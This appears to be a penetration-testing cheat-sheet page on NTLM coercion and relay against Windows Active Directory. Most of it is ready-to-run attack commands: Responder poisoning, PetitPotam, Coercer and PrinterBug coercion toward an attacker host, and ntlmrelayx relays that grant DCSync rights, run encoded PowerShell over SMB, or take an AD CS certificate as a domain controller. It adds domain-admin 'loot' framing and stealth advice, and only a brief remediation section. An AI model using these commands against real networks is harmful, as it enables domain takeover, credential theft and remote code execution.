---
tags:
  - Network
  - Windows
---

# :material-transit-connection-variant: Coercion & NTLM Relay

<span class="pill pill-hard">no cracking needed</span> <span class="pill pill-info">network</span>

Why crack a hash when you can *relay* it live? Coerce a victim to authenticate to you, then forward that authentication to a service that doesn't enforce signing.

!!! abstract "TL;DR"
    Poison/coerce authentication → relay it with `ntlmrelayx` to LDAP/SMB/AD CS. Prime targets: SMB signing off, LDAP signing off, or AD CS web enrollment (ESC8).

## :material-broadcast: Get the authentication

=== "Poisoning"

    ```bash
    responder -I eth0 -wdv        # answer LLMNR/NBT-NS/mDNS
    ```

=== "Coercion"

    ```bash
    petitpotam.py -u u -p p ATTACKER DC   # MS-EFSRPC
    coercer coerce -u u -p p -t DC -l ATTACKER
    printerbug.py corp/u:p@DC ATTACKER    # MS-RPRN
    ```

## :material-arrow-right-bold: Relay it

```bash
# Turn off Responder's SMB/HTTP servers first, then:
ntlmrelayx.py -t ldaps://DC --escalate-user lowpriv      # grant DCSync rights
ntlmrelayx.py -t smb://HOST -c 'powershell -enc ...'     # exec if signing off
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs   # ESC8 → cert as victim
```

!!! loot "ESC8 = instant DA path"
    Relay a coerced **DC machine account** to AD CS web enrollment, get a cert for the DC, then use it to DCSync.

!!! opsec "Poisoning is loud"
    Responder answers broadcast traffic network-wide; targeted coercion (one host → you) is quieter and more surgical.

## :material-shield-check: Remediation

- Enforce SMB **and** LDAP signing/channel binding; disable LLMNR/NBT-NS.
- Patch/disable AD CS HTTP enrollment; restrict coercion RPC.

## :material-link-variant: Related

- Follows on from [SMB](smb.md); certs → [Active Directory](active-directory.md); AD CS ESC → [AD CS](adcs.md).
- Reference: [The Hacker Recipes — NTLM Relay](https://www.thehacker.recipes/).
